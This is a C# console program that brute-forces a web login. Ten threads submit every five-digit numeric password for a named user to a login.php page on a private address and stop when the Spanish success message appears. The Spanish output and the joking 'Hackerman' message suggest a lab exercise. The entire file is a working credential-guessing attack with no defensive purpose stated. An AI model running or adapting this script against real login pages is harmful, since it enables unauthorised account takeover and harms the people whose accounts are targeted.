using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;

class PasswordCracker
{
    static readonly string targetAddress = "http://192.168.161.31/login.php";
    static readonly string successMessage = "Conectado correctamente";
    static readonly string user = "JoseAntonio.Liebana";
    static readonly object syncLock = new object();
    static bool foundPassword = false;

    static async Task Main()
    {
        int totalThreads = 10;
        var workerTasks = new Task[totalThreads];

        for (int i = 0; i < totalThreads; i++)
        {
            workerTasks[i] = Task.Run(() => PasswordAttack());
        }

        await Task.WhenAll(workerTasks);

        Console.WriteLine("Presiona una tecla para finalizar por favor");
        Console.ReadKey();
    }

    static void PasswordAttack()
    {
        while (!foundPassword)
        {
            int currentAttempt = FetchNextPassword();
            string passwordAttempt = currentAttempt.ToString("D5");

            bool isSuccess = TryLogin(passwordAttempt).Result;

            Console.WriteLine("Probando contraseña: " + passwordAttempt);
            if (isSuccess)
            {
                Console.WriteLine("¡Enhoranbuena Hackerman! Contraseña correcta encontrada!");
                Console.WriteLine("Usuario: " + user);
                Console.WriteLine("Contraseña: " + passwordAttempt);
                lock (syncLock)
                {
                    foundPassword = true;
                }
                break;
            }
        }
    }

    static int passwordCounter = 99999;

    static int FetchNextPassword()
    {
        lock (syncLock)
        {
            return passwordCounter--;
        }
    }

    static async Task<bool> TryLogin(string password)
    {
        using (var httpClient = new HttpClient())
        {
            var postData = new FormUrlEncodedContent(new[]
            {
                new KeyValuePair<string, string>("username", user),
                new KeyValuePair<string, string>("password", password)
            });

            try
            {
                HttpResponseMessage result = await httpClient.PostAsync(targetAddress, postData);
                string resultContent = await result.Content.ReadAsStringAsync();
                return resultContent.Contains(successMessage);
            }
            catch (HttpRequestException)
            {
                return false;
            }
        }
    }
}
